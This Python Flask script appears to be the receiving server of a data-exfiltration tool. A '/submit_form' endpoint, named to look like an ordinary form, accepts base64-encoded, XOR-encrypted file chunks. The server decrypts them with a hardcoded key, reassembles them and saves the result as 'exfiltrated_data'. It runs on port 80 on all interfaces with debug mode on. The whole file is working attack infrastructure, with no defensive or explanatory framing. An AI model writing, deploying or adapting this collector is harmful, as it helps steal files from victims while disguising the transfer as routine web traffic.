from flask import Flask, request
import base64
import os

app = Flask(__name__)

# XOR decryption function
def xor_decrypt(data, key):
    key_bytes = key.encode('utf-8')
    key_len = len(key_bytes)
    decrypted = bytearray()
    for i, byte in enumerate(data):
        decrypted.append(byte ^ key_bytes[i % key_len])
    return bytes(decrypted)

# Store chunks in memory
chunks = {}
file_extension = ""

@app.route('/submit_form', methods=['POST'])
def receive_data():
    global file_extension
    try:
        encoded_data = request.form.get('chunk_data')
        seq_num = int(request.form.get('sequence_number'))
        total_chunks = int(request.form.get('total_chunks'))
        ext = request.form.get('file_extension')
        if not encoded_data:
            return "Error: No chunk data received", 400

        if seq_num == 0 and ext:
            file_extension = ext

        encrypted_data = base64.b64decode(encoded_data)
        print(f"Received chunk {seq_num + 1} of {total_chunks}, size: {len(encrypted_data)} bytes")

        # Skip decryption for image files
        if file_extension in ['.png', '.jpg', '.jpeg', '.bmp']:
            decrypted_chunk = encrypted_data  # No decryption
        else:
            key = "mysecretkey"
            decrypted_chunk = xor_decrypt(encrypted_data, key)

        chunks[seq_num] = decrypted_chunk

        if len(chunks) == total_chunks:
            full_data = b''.join(chunks[i] for i in range(total_chunks))
            output_filename = "exfiltrated_data" + (file_extension if file_extension else ".bin")
            with open(output_filename, 'wb') as f:
                f.write(full_data)
            print(f"File fully received and saved as {output_filename}, size: {len(full_data)} bytes")
            chunks.clear()
            file_extension = ""
            return "All chunks received", 200

        return f"Chunk {seq_num} received", 200
    except Exception as e:
        print(f"Error: {str(e)}")
        return f"Error: {str(e)}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)